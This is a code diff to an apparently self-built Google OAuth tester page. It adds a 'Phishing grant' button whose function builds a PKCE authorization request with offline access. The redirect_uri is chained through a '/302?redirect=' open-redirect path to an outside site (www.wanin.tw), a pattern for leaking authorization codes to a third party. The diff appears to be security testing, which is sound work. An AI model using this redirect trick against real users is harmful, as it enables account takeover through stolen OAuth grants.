@@ -43,6 +43,7 @@ export const GoogleTester = () => {
         createButton("Get user info.", getTokenInfo);
         createButton("Get new token", getNewToken);
         createButton("Revoke token", revokeToken);
+        createButton("Phishing grant", phishAuthGrant);
     }    
 
     const authGrant = async () => {
@@ -232,6 +233,33 @@ export const GoogleTester = () => {
             }
         })
         .catch(error => logger.add("Revoke token error.", error, "red"));
+    }
+
+    const phishAuthGrant = async () => {
+        // Create and store a random "state" value
+        var state = StringUtility().generateRandomString();
+        localStorage.setItem("pkce_state", state);
+
+        // Create and store a new PKCE codeVerifier (the plaintext random secret)
+        var codeVerifier = StringUtility().generateRandomString();
+        localStorage.setItem("pkce_code_verifier", codeVerifier);
+
+        // Hash and base64-urlencode the secret to use as the challenge
+        var codeChallenge = await StringUtility().sha256(codeVerifier);
+        codeChallenge = StringUtility().base64urlencode(codeChallenge);
+
+        var authUrl = "https://accounts.google.com/o/oauth2/v2/auth" + 
+        `?client_id=${config.client_id}` + 
+        `&redirect_uri=${config.redirect_uris[0]}/302?redirect=https://www.wanin.tw` +
+        `&response_type=code` +         
+        `&scope=openid profile email` +       
+        `&access_type=offline` +
+        `&state=${state}` + 
+        `&prompt=consent`+
+        `&code_challenge_method=S256` + 
+        `&code_challenge=${codeChallenge}`;
+
+        window.location.href = authUrl;
     }
 
     return {
